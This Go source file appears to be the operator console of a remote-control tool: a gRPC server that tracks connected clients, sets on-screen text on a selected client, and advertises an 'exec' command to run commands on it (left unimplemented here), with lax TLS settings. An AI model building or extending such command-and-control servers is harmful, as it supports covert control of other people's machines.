package main

import (
	"crypto/tls"
	"encoding/json"
	"log"
	"net"
	"os"
	"strings"

	pb "github.com/Xart3mis/GoHkarComms/client_data_pb"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/fatih/color"
	"github.com/magodo/textinput"

	"golang.org/x/net/context"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

type server struct {
	pb.ConsumerServer
}

var client_ids []string
var client_onscreentext map[string]string = make(map[string]string)

var current_id string = ""

func main() {
	go func() {
		p := tea.NewProgram(initialModel(), tea.WithAltScreen())

		if err := p.Start(); err != nil {
			log.Fatal(err)
		}
	}()

	creds, err := loadTLSCredentials()
	if err != nil {
		log.Fatalln(err)
	}

	s := grpc.NewServer(grpc.Creds(creds))
	lis, err := net.Listen("tcp", "0.0.0.0:8000")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	pb.RegisterConsumerServer(s, &server{})

	err = s.Serve(lis)
	if err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}

}

func loadTLSCredentials() (credentials.TransportCredentials, error) {
	// Load server's certificate and private key
	serverCert, err := tls.LoadX509KeyPair("./../cert/server-cert.pem", "./../cert/server-key.pem")
	if err != nil {
		return nil, err
	}

	// Create the credentials and return it
	config := &tls.Config{
		Certificates:       []tls.Certificate{serverCert},
		ClientAuth:         tls.NoClientCert,
		InsecureSkipVerify: true,
	}

	return credentials.NewTLS(config), nil
}

func (s *server) UnregisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
	var linearSearch func(s []string, val string) int = func(s []string, val string) int {
		for i, v := range s {
			if v == val {
				return i
			}
		}

		return -1
	}

	var rmelem func(s []string, idx int) []string = func(s []string, idx int) []string {
		if idx == -1 {
			return []string{}
		}

		return append(s[:idx], s[idx+1:]...)
	}

	client_ids = rmelem(client_ids, linearSearch(client_ids, in.ClientId))
	return &pb.RegisterResponse{Status: 0}, nil
}

func (s *server) RegisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}
	return &pb.RegisterResponse{Status: 0}, nil
}

func Contains(sl []string, name string) bool {
	for _, value := range sl {
		if value == name {
			return true
		}
	}
	return false
}

func (s *server) GetOnScreenText(ctx context.Context, in *pb.ClientDataRequest) (*pb.ClientDataOnScreenTextResponse, error) {
	if in.ClientId == current_id {
		return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
			ShouldUpdate: len(client_onscreentext[current_id]) > 0,
			OnScreenText: client_onscreentext[current_id],
		},
		}, nil
	}
	return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{}}, nil
}

type model struct {
	textInput      textinput.Model
	typing         bool
	showhelplist   bool
	showclientlist bool
	err            error
	clients        []string
}

func initialModel() model {
	ti := textinput.NewModel()
	ti.Placeholder = "help"

	red := color.New(color.FgRed).SprintFunc()
	ti.Prompt = red(">> ")
	ti.PromptStyle.Bold(true)

	ti.PromptStyle.PaddingRight(10)
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = 20

	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients"}
	ti.StyleCandidate.Foreground(lipgloss.Color("#BC4749"))
	ti.CandidateViewMode = textinput.CandidateViewHorizental

	return model{
		textInput:      ti,
		err:            nil,
		typing:         true,
		showhelplist:   false,
		showclientlist: false,
		clients:        client_ids,
	}
}

func (m model) Init() tea.Cmd {
	return textinput.Blink
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			os.Exit(0)
			return m, tea.Quit

		case "esc", "q":
			m.showhelplist = false
			m.showclientlist = false
			return m, nil

		case "enter":
			m.clients = client_ids

			// if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
			// 	re := regexp.MustCompile("(`(?:`??[^`]*?`))")

			// 	fmt.Println(string(re.Find([]byte(m.textInput.Value()))))
			// }

			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
				split_str := strings.Split(m.textInput.Value(), " ")
				if len(split_str) > 2 {
					panic("select only takes 1 argument")
				}
				current_id = split_str[1]
			}

			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
				split_str := strings.Split(m.textInput.Value(), " ")
				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
			}

			switch m.textInput.Value() {
			case "help":
				m.showhelplist = true
				return m, nil
			case "exit":
				return m, tea.Quit
			case "list_clients":
				m.showclientlist = true
				return m, nil
			default:
				return m, nil
			}
		}
	case error:
		m.err = msg
		return m, nil
	}

	m.textInput, cmd = m.textInput.Update(msg)
	return m, cmd

}

func (m model) View() string {
	if m.showhelplist {
		yellow := color.New(color.FgYellow).SprintFunc()
		green := color.New(color.FgGreen).SprintFunc()

		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
			green("select") + "\nselect a client to connect to (usage: " + yellow("select [`client id`]") + ")\n\n" +
			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n"
	} else if m.showclientlist {
		Magenta := color.New(color.FgMagenta).SprintFunc()
		b, _ := json.MarshalIndent(m.clients, "", "\t")
		return m.textInput.View() + "\n\n" + Magenta(string(b))
	}

	return m.textInput.View()
}
